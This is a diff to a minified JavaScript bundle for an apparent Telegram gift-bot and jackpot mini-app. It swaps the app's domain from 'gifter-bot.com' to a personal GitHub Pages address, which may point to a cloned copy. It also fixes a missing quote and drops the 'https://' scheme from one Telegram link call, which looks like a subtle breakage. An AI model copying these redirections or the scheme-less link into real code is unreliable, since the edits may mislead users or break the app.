@@ -3998,7 +3998,7 @@ const telegramInitService = new TelegramInitService
                         return d.value = e.data.botUsername,
                             !0
                 } catch (e) {
-                    d.value = https://depotik.github.io/gift-bot.github.io"
+                    d.value = "https://depotik.github.io/gift-bot.github.io"
                 }
                 return !1
             }
@@ -4107,7 +4107,7 @@ const telegramInitService = new TelegramInitService
                 ,
                 maintenanceMode: l,
                 openTelegramChannel: () => {
-                    window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp.openTelegramLink("https://t.me/gifterint_official_bot") : window.open("https://t.me/gifterint_official_bot", "_blank")
+                    window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp.openTelegramLink("t.me/gifterint_official_bot") : window.open("https://t.me/gifterint_official_bot", "_blank")
                 }
                 ,
                 showLoginWidget: c,
@@ -25824,7 +25824,7 @@ const JackpotMain = _export_sfc$1(_sfc_main, [["render", _sfc_render], ["__scope
 })
     , Variables = ""
     , styles = ""
-    , domains = ["https://gifter-bot.com"];
+    , domains = ["https://depotik.github.io/gift-bot.github.io"];
 function getRandomDomain() {
     const e = Math.floor(Math.random() * domains.length);
     return domains[e]
@@ -25871,7 +25871,5 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     });
 });
-
-
 
 
